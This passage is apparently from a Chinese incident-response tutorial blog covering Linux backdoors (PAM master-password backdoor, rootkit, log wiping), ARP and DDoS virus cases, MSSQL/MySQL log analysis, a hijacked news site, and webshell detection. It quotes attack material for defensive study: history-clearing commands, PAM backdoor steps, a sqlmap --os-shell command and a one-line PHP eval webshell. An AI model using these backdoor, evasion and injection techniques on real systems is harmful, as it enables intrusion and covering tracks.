class="line">export HISTSIZE=<span class="number">0</span></span><br><span class="line">echo &gt;/root/<span class="selector-class">.bash_history</span> <span class="comment">//清空操作日志</span></span><br></pre></td></tr></table></figure><p>排查技巧：利用strace找出ssh后门.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、获取可疑进程PI</span></span><br><span class="line">ps aux | <span class="keyword">grep</span> sshd</span><br><span class="line"><span class="comment"># 2、跟踪sshd PID</span></span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"><span class="comment"># 3、查看记录密码打开文件</span></span><br><span class="line"><span class="keyword">grep</span> <span class="keyword">open</span> sshd* | <span class="keyword">grep</span> -v -e No -e  null -e denied| <span class="keyword">grep</span>  WR</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>9、PAM后门</strong></p><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p><p>利用方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure><p>排查技巧：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、通过Strace跟踪ssh</span></span><br><span class="line">ps axu | <span class="keyword">grep</span> sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line"><span class="keyword">grep</span> <span class="keyword">open</span> aa* | <span class="keyword">grep</span> -v -e No -e null -e denied| <span class="keyword">grep</span> WR</span><br><span class="line"><span class="comment"># 2、检查pam_unix.so的修改时间</span></span><br><span class="line"><span class="keyword">stat</span> /lib/security/pam_unix.so      <span class="comment">#32位</span></span><br><span class="line"><span class="keyword">stat</span> /lib64/security/pam_unix.so    <span class="comment">#64位</span></span><br></pre></td></tr></table></figure><p><strong>10、rookit后门</strong></p><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p><p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p><p>连接后的截图：</p><p><img src=".%5Cimage%5Cprivilege-5-7.png" alt=""></p><p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第04章：Windows实战篇第4篇：ARP病毒</title>
      <link href="/posts/d06caa4c.html"/>
      <url>/posts/d06caa4c.html</url>
      
        <content type="html"><![CDATA[<h2 id="第4篇：ARP病毒">第4篇：ARP病毒</h2><h3 id="0x00-前言">0x00 前言</h3><p>ARP病毒并不是某一种病毒的名称，而是对利用arp协议的漏洞进行传播的一类病毒的总称，目前在局域网中较为常见。发作的时候会向全网发送伪造的ARP数据包，严重干扰全网的正常运行，其危害甚至比一些蠕虫病毒还要严重得多。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>某天早上，小伙伴给我发了一个微信，说192.168.64.76 CPU现在负载很高，在日志分析平台查看了一下这台服务器的相关日志，流量在某个时间点暴涨，发现大量137端口的UDP攻击。</p><p><img src="image/win-9-1.png" alt=""></p><h3 id="0x02-分析过程">0x02 分析过程</h3><p>登录服务器，首先查看137端口对应的进程，进程ID为4对应的进程是SYSTEM，于是使用杀毒软件进行全盘查杀。</p><p><img src="image/win-9-2.png" alt=""></p><p>卡巴斯基绿色版：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></p><p>卡巴斯基、360杀毒、McAfee查杀无果，手工将启动项、计划任务、服务项都翻了一遍，并未发现异常。<br>本地下载了IpTool抓包工具，筛选条件： 协议 UDP  端口 137</p><p><img src="image/win-9-3.png" alt=""></p><p>可以明显的看出192.168.64.76发送的数据包是异常的，192.168.64.76的数据包目的地址，一直在变，目的MAC是不变的，而这个MAC地址就是网关的MAC。</p><p>端口137的udp包是netbios的广播包，猜测：可能是ARP病毒，由本机对外的ARP攻击。</p><p>采用措施：通过借助一些安全软件来实现局域网ARP检测及防御功能。</p><p>服务器安全狗Windows版下载：<a href="http://free.safedog.cn/server_safedog.html">http://free.safedog.cn/server_safedog.html</a></p><p>网络防火墙–攻击防护–ARP防火墙：</p><p><img src="image/win-9-4.png" alt=""></p><p>虽然有拦截了部分ARP请求，但流量出口还是有一些137 UDF的数据包。</p><p>看来还是得下狠招，关闭137端口：禁用TCP/IP上的NetBIOS。</p><p>1）、禁用Server服务</p><p><img src="image/win-9-5.png" alt=""></p><p>2）、禁用 TCP/IP 上的 NetBIOS</p><p><img src="image/win-9-6.png" alt=""></p><p>设置完，不用重启即可生效，137端口关闭，观察了一会，对外发起的请求已消失，CPU和网络带宽恢复正常。</p><h3 id="0x04-防护措施">0x04 防护措施</h3><p>局域网安全防护依然是一项很艰巨的任务，网络的安全策略，个人/服务器的防毒机制，可以在一定程度上防止病毒入侵。</p><p>另外不管是个人PC还是服务器，总还是需要做一些基本的安全防护：1、关闭135/137/138/139/445等端口   2、更新系统补丁。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第02章：日志分析篇第4篇：MSSQL日志分析</title>
      <link href="/posts/e1eabb1a.html"/>
      <url>/posts/e1eabb1a.html</url>
      
        <content type="html"><![CDATA[<h2 id="第4篇-MSSQL日志分析">第4篇:MSSQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-MSSQL日志分析">0x01 MSSQL日志分析</h3><p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-4-3.png" alt=""></p><p>登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志</p><p><img src="https://gitee.com/eviden/img/raw/master/log-4-4.png" alt=""></p><p>双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。</p><p><img src="./image/log-4-5.png" alt=""></p><p>另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-4-6.png" alt=""></p><p>日志分析案例：</p><p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。</p><p><img src="./image/log-4-7.png" alt=""></p><p>筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p><p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-4-8.png" alt=""></p><h3 id="0x02-SQL注入入侵痕迹">0x02  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-1.png" alt=""></p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、数据库表检查</p><p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-2.png" alt=""></p><p>2、检查xp_cmdshell等存储过程</p><p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p><p>`Exec master.dbo.xp_cmdshell ‘whoami’</p><p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第4篇：新闻源网站劫持</title>
      <link href="/posts/a96fe737.html"/>
      <url>/posts/a96fe737.html</url>
      
        <content type="html"><![CDATA[<h2 id="第4篇：新闻源网站劫持">第4篇：新闻源网站劫持</h2><p>新闻源网站一般权重较高，收录快，能够被搜索引擎优先收录，是黑灰产推广引流的必争之地，很容易成为被攻击的对象。被黑以后主要挂的不良信息内容主要是博彩六合彩等赌博类内容，新闻源网站程序无论是自主开发的还是开源程序，都有被黑的可能，开源程序更容易被黑。</p><h3 id="现象描述：">现象描述：</h3><p>某新闻源网站首页广告链接被劫持到菠菜网站</p><p><img src="./image/4-1.png" alt=""></p><p>有三个广告专题，链接形式如下：</p><p>​<a href="http://www.xxx.cn/zhuanti/yyysc/index.shtml">http://www.xxx.cn/zhuanti/yyysc/index.shtml</a></p><p>​<a href="http://www.xxx.cn/zhuanti/wwwsc/index.shtml">http://www.xxx.cn/zhuanti/wwwsc/index.shtml</a></p><p>​<a href="http://www.xxx.cn/zhuanti/zzzsc/index.shtml">http://www.xxx.cn/zhuanti/zzzsc/index.shtml</a></p><p>点击这三条链接会跳转到博彩网站。简单抓包分析一下过程：</p><p><img src="./image/4-2.png" alt=""></p><p>可以发现此时这个返回页面已被劫持，并且加载了第三方js文件，<a href="http://xn--dpqw2zokj.com/N/js/dt.js%EF%BC%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%AE%BF%E9%97%AE%E8%AF%A5%E6%96%87%E4%BB%B6%EF%BC%9A">http://星传媒.com/N/js/dt.js，进一步访问该文件：</a></p><p><img src="./image/4-3.png" alt=""></p><p>dt.js进一步加载了另一条js，访问<a href="http://xn--dpqw2zokj.com/N/js/yz.js">http://星传媒.com/N/js/yz.js</a></p><p><img src="./image/4-4.png" alt=""></p><p>我们发现链接跳转到https://lemcoo.com/?dt，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。</p><p><img src="./image/4-5.png" alt=""></p><h3 id="问题处理：">问题处理：</h3><p>找到url对应的文件位置，即使文件被删除，链接依然可以访问，可以发现三条链接都是以“sc”后缀。</p><p>对Nginx配置文件进行排查，发现Nginx配置文件VirtualHost.conf被篡改，通过反向代理匹配以“sc”后缀的专题链接，劫持到<a href="http://103.233.248.163">http://103.233.248.163</a>，该网站为博彩链接导航网站。</p><p><img src="./image/4-6.png" alt=""></p><p>删除恶意代理后，专题链接访问恢复。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第01章：入侵排查篇第4篇：如何发现隐藏的 Webshell 后门</title>
      <link href="/posts/154b8f21.html"/>
      <url>/posts/154b8f21.html</url>
      
        <content type="html"><![CDATA[<h2 id="第4篇：如何发现隐藏的-Webshell-后门">第4篇：如何发现隐藏的 Webshell 后门</h2><h3 id="前言：">前言：</h3><p>如何在百万行代码里发现隐藏的后门？</p><p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p><p>即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。</p><p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p><p>本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。</p><hr><p><strong>1、文件 MD5 校验</strong></p><p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的&quot;特征值&quot;。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下载地址：http:<span class="regexp">//</span>www.d99net.net<span class="regexp">/down/</span>WebShellKill_V2.<span class="number">0.9</span>.zip</span><br><span class="line">文件 MD5：<span class="number">29285</span>decadbce3918a4f8429ec33df46   WebShellKill.exe</span><br></pre></td></tr></table></figure><p>当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。</p><p>那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。</p><p>文件 hash 值计算：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def md5sum(<span class="keyword">file</span>):</span><br><span class="line">    <span class="keyword">m</span>=hashlib.md5()</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="keyword">file</span>):</span><br><span class="line">        <span class="keyword">f</span>=<span class="keyword">open</span>(<span class="keyword">file</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">line</span> in <span class="keyword">f</span>:</span><br><span class="line">            <span class="keyword">m</span>.<span class="keyword">update</span>(<span class="built_in">line</span>)</span><br><span class="line">        <span class="keyword">f</span>.<span class="keyword">close</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">m</span>.<span class="keyword">update</span>(<span class="keyword">file</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">m</span>.hexdigest())</span><br></pre></td></tr></table></figure><p>对文件进行哈希值重新计算，进行校验对比，测试效果：</p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-1.png" alt=""></p><p>如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。</p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-2.png" alt=""></p><p><strong>2、diff 命令</strong></p><p>在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -c -<span class="selector-tag">a</span> -r cms1 cms2</span><br></pre></td></tr></table></figure><p>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 <code>@eval($_POST['g']);</code></p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-3.png" alt=""></p><p>备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p><p><strong>3、版本控制工具</strong></p><p>版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p><p>另外，也可以通过 git diff 用来比较文件之间的不同。</p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-4.png" alt=""></p><p><strong>4、文件对比工具</strong></p><p>关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。</p><p><strong>Beyond Compare</strong></p><p>Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p><p>下载地址：<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a></p><p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p><p>1、双击 Beyond Compare ，打开软件主页，选择文件夹比较。</p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-5.png" alt=""></p><p>2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。</p><p><img src="./image/20200411-6.png" alt=""></p><p>3、双击具体文件，进入代码对比，找到代码差异部分。</p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-7.png" alt=""></p><p><strong>WinMerge</strong></p><p>WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p><p>下载地址：<a href="https://winmerge.org/downloads/">https://winmerge.org/downloads/</a></p><p>1、文件 – 打开，选择文件或文件夹，然后点击进行比较。</p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-8.png" alt=""></p><p>2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。</p><p><img src="https://gitee.com/eviden/img/raw/master/20200411-9.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第01章：入侵排查篇第3篇：常见的 Webshell 查杀工具</title>
      <link href="/posts/959c780.html"/>
      <url>/posts/959c780.html</url>
      
        <content type="html"><![CDATA[<h2 id="第3篇：常见的-Webshell-查杀工具">第3篇：常见的 Webshell 查杀工具</h2><h3 id="前言">前言</h3><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><p>本文推荐了10款 WebShll 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。</p><hr><p><strong>1、D盾_Web查杀</strong></p><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</p><p>兼容性：只提供 Windows 版本。</p><p>工具下载地址：<a href="http://www.d99net.net">http://www.d99net.net</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-1.png" alt=""></p><p><strong>2、百度 WEBDIR+</strong></p><p>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com">https://scanner.baidu.com</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-2.png" alt=""></p><p><strong>3、河马</strong></p><p>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持 Windows、Linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com">https://www.shellpub.com</a></p><p><img src="./image/20200407-3.png" alt=""></p><p><strong>4、Web Shell Detector</strong></p><p>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</p><p>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com">http://www.shelldetector.com</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-4.png" alt=""></p><p><strong>5、CloudWalker（牧云）</strong></p><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性：提供 Linux版本，Windows 暂不支持。</p><p>在线查杀 demo：<a href="https://webshellchop.chaitin.cn">https://webshellchop.chaitin.cn</a></p><p>GitHub 项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-5.png" alt=""></p><p><strong>6、Sangfor WebShellKill</strong></p><p>Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p><p>兼容性：支持 Windows、linux</p><p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html%EF%BC%88%E5%B7%B2%E5%81%9C%E6%AD%A2%E8%AE%BF%E9%97%AE%EF%BC%89">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-6.png" alt=""></p><p><strong>7、深度学习模型检测 PHP Webshell</strong></p><p>一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me">http://webshell.cdxy.me</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-7.png" alt=""></p><p><strong>8、PHP Malware Finder</strong></p><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p><p>兼容性：提供Linux 版本，Windows 暂不支持。</p><p>GitHub 项目地址：<a href="https://github.com/jvoisin/php-malware-finder">https://github.com/jvoisin/php-malware-finder</a></p><p><img src="./image/20200407-8.png" alt=""></p><p><strong>9、findWebshell</strong></p><p>这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。</p><p>GitHub 项目地址：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-9.png" alt=""></p><p><strong>10、在线 WebShell 查杀工具</strong></p><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell">http://tools.bugscaner.com/killwebshell</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-10.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第05章：Linux实战篇第5篇：DDOS病毒</title>
      <link href="/posts/fd257a8e.html"/>
      <url>/posts/fd257a8e.html</url>
      
        <content type="html"><![CDATA[<h2 id="第5篇：DDOS病毒">第5篇：DDOS病毒</h2><h3 id="现象描述">现象描述</h3><p>某服务器网络资源异常,感染该木马病毒的服务器会占用网络带宽，甚至影响网络业务正常应用。</p><h3 id="系统分析">系统分析</h3><p>针对日志服务器病毒事件排查情况：<br>在开机启动项/etc/rc.d/rc.local发现可疑的sh.sh脚本，进一步跟踪sh.sh脚本,这是一个检测病毒十分钟存活的脚本。</p><p>在root目录下发现存活检测脚本</p><p><img src="./image/linux-14-1.png" alt=""></p><p>解决步骤：</p><ol><li>结束进程 ps aux | grep “conf.m” | grep -v grep | awk ‘{print $2}‘| xargs kill -9</li><li>清除自动启动脚本 vim /etc/rc.local 去掉 sh /etc/chongfu.sh &amp;</li><li>清除 脚本 rm -rf /etc/chongfu.sh /tem/chongfu.sh</li><li>修改登录密码 passwd</li><li>重启。 reboot</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第02章：日志分析篇第5篇：MySQL日志分析</title>
      <link href="/posts/83431f6c.html"/>
      <url>/posts/83431f6c.html</url>
      
        <content type="html"><![CDATA[<h2 id="第5篇-MySQL日志分析">第5篇:MySQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-Mysql日志分析">0x01 Mysql日志分析</h3><p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查看<span class="built_in">log</span>配置信息</span><br><span class="line">show <span class="keyword">variables</span> like <span class="comment">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="number">2</span>、开启日志</span><br><span class="line"><span class="keyword">SET</span> GLOBAL <span class="comment">general_log =</span> <span class="comment">&#x27;On&#x27;</span>;</span><br><span class="line"><span class="number">3</span>、指定日志文件路径</span><br><span class="line">#<span class="keyword">SET</span> GLOBAL <span class="comment">general_log_file =</span> <span class="comment">&#x27;/var/lib/mysql/mysql.log&#x27;</span>;</span><br></pre></td></tr></table></figure><p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">190604</span> <span class="number">14</span>:<span class="number">46</span>:<span class="number">14</span>       <span class="number">14</span> Connect    root@localhost <span class="literal">on</span> </span><br><span class="line">           <span class="attribute">14</span> Init DB    test</span><br><span class="line">           <span class="attribute">14</span> Query    SELECT * FROM admin WHERE id = <span class="number">1</span></span><br><span class="line">           <span class="attribute">14</span> Quit  `</span><br></pre></td></tr></table></figure><p>我们按列来解析一下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一列:<span class="type">Time</span>，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些<span class="keyword">sql</span>语句几乎是同时执行的,所以就不另外记录时间了。</span><br><span class="line">第二列:Id，就是<span class="keyword">show</span> processlist出来的第一列的线程ID,对于长连接和一些比较耗时的<span class="keyword">sql</span>语句,你可以精确找出究竟是那一条那一个线程在运行。</span><br><span class="line">第三列:Command，操作类型，比如<span class="keyword">Connect</span>就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。</span><br><span class="line">第四列:Argument，详细信息，例如 <span class="keyword">Connect</span>    root<span class="variable">@localhost</span> <span class="keyword">on</span> 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</span><br></pre></td></tr></table></figure><h3 id="0x02-登录成功-失败">0x02 登录成功/失败</h3><p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-5-1.png" alt=""></p><p>MySQL中的log记录是这样子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Time</span>                 Id        Command         Argument</span><br><span class="line"></span><br><span class="line"><span class="number">190601</span> <span class="number">22</span>:<span class="number">03</span>:<span class="number">20</span>   <span class="number">98</span> <span class="keyword">Connect</span>root@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">   <span class="number">98</span> <span class="keyword">Connect</span><span class="keyword">Access</span> denied <span class="keyword">for</span> <span class="keyword">user</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;192.168.204.1&#x27;</span> (<span class="keyword">using</span> <span class="keyword">password</span>: YES)</span><br><span class="line">  <span class="number">103</span> <span class="keyword">Connect</span>mysql@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">  <span class="number">103</span> <span class="keyword">Connect</span><span class="keyword">Access</span> denied <span class="keyword">for</span> <span class="keyword">user</span> <span class="string">&#x27;mysql&#x27;</span>@<span class="string">&#x27;192.168.204.1&#x27;</span> (<span class="keyword">using</span> <span class="keyword">password</span>: YES)</span><br><span class="line">  <span class="number">104</span> <span class="keyword">Connect</span>mysql@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">  